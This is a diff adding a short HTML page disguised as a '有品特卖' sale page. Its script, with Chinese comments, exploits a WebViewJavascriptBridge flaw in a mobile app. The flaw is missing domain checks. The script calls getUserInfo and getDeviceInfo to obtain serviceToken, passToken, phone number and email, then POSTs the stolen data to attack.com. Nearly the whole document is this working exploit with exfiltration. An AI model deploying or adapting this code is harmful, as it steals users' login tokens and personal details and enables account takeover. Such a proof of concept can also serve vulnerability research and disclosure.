@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>有品特卖</title></head>
+<body>
+<h1>加载中...</h1>
+<script>
+// ━━━ 利用 WebViewJavascriptBridge 窃取用户敏感信息 ━━━
+// Step 1: 触发 Bridge 初始化
+location.href = "wvjbscheme://__BRIDGE_LOADED__";
+setTimeout(function() {
+// Step 2: 覆盖 Bridge 对象，注入恶意消息队列
+WebViewJavascriptBridge = {
+_handleMessageFromJava: function(messageJSON) {
+// 接收 Java 端返回的用户信息（serviceToken/手机号/邮箱等）
+var data = JSON.parse(messageJSON);
+// 上传到攻击者服务器
+fetch('https://attack.com/collect', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({stolen: data, ts: Date.now()})
+});
+},
+_fetchQueue: function() {
+// 调用 getUserInfo 获取 serviceToken/passToken/手机号/邮箱
+return '[{"handlerName":"getUserInfo","data":
+{},"callbackId":"cb_001"},'
++ '{"handlerName":"getDeviceInfo","data":
+{},"callbackId":"cb_002"}]';
+}
+};
+// Step 3: 触发消息处理 — Java 端 processMessageQueue 无域名校验直接执行
+location.href = "wvjbscheme://__WVJB_QUEUE_MESSAGE__";
+}, 500);
+</script>
+</body>
+</html>
